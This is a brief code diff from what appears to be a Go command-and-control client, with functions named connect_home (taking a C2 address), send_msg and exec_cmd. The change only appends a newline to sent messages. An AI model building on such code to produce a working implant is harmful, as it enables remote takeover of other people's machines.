@@ -35,7 +35,7 @@ func connect_home(C2 string)  (net.Conn, error) {
 }
 
 func send_msg(conn net.Conn, msg string) {
-	fmt.Fprintf(conn, "%s", msg)
+	fmt.Fprintf(conn, "%s\n", msg)
 }
 
 func exec_cmd(cmd string) string {
